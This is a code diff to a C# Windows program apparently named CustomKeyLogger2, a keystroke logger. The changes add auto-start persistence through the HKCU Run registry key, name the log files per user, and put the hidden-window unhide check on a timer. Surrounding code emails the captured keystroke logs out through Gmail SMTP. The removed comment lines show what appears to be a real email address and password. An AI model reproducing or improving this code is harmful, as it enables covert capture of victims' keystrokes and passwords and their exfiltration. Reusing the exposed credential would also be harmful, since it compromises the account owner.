@@ -11,6 +11,7 @@ using System.Runtime.InteropServices;
 using System.IO;
 using System.Collections;
 using System.Net.Mail;
+using Microsoft.Win32;
 
 namespace CustomKeyLogger2
 {
@@ -42,6 +43,8 @@ namespace CustomKeyLogger2
             InitKeyWords();
 
             InitEmail();
+
+            InitStartUp();
         }
 
         private void InitStream()
@@ -50,7 +53,7 @@ namespace CustomKeyLogger2
             atmdir += "\\";
 
             keywordsFileDir = atmdir + "keywords.krs";
-            logsFileDir = atmdir + "logs.krs";
+            logsFileDir = atmdir + Environment.UserName + "-logs.krs";
             attachFileDir = atmdir + "attachlog.txt";
             StreamWriter sw;
             if (!File.Exists(keywordsFileDir))
@@ -107,8 +110,19 @@ namespace CustomKeyLogger2
         {
             txtEmail.Text = Properties.Settings.Default.GMail;
             txtPassWord.Text = LoadPassword();
+            lblMailStatus.Text = "";
             
-            
+        }
+
+        private void InitStartUp()
+        {
+            RegistryKey regKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+            string result = (string)regKey.GetValue(Application.ProductName, "NotFound");
+            if (result != Application.ExecutablePath)
+            {
+                regKey.SetValue(Application.ProductName, Application.ExecutablePath);
+                regKey.Close();
+            }
         }
 
         private void btnStart_Click(object sender, EventArgs e)
@@ -390,8 +404,9 @@ namespace CustomKeyLogger2
 
             writeUp = writeUp + temp;
 
-            unhide();
 #if Temp
+            unhide();
+
             checkKeys();
 #endif
             writeToFile(temp);
@@ -399,9 +414,9 @@ namespace CustomKeyLogger2
         
         public void unhide()
         {
-            if (writeUp.Contains(secretWord) && secretWord != "")
+            if (secretWord != "" && writeUp.Contains(secretWord))
             {
-                writeUp = writeUp.Replace(secretWord,"");
+                writeUp = writeUp.Replace(secretWord, "");
                 this.ShowWindow();
             }
         }
@@ -486,9 +501,9 @@ namespace CustomKeyLogger2
             message.Attachments.Add(attach);
             System.Net.NetworkCredential SMTPUserInfo = new System.Net.NetworkCredential(Properties.Settings.Default.GMail,
                 LoadPassword());
-            //MailMessage message = new MailMessage("aungthumoe5@gmail.com", "aungthumoe5@gmail.com",
+            //MailMessage message = new MailMessage("aaa@gmail.com", "aaa@gmail.com",
             //    "CustomKeyLogger2 - Logs", "logs report");
-            //System.Net.NetworkCredential SMTPUserInfo = new System.Net.NetworkCredential("aungthumoe5@gmail.com","3530505Q067785@tm5");
+            //System.Net.NetworkCredential SMTPUserInfo = new System.Net.NetworkCredential("aaa@gmail.com","password");
 
             emailClient = new SmtpClient("smtp.gmail.com", 587);
             emailClient.SendCompleted += new SendCompletedEventHandler(SendCompletedCallback);
@@ -584,6 +599,11 @@ namespace CustomKeyLogger2
         private void Form1_FormClosing(object sender, FormClosingEventArgs e)
         {
             Properties.Settings.Default.Save();
+        }
+
+        private void timUnHide_Tick(object sender, EventArgs e)
+        {
+            unhide();
         }
     }
 }
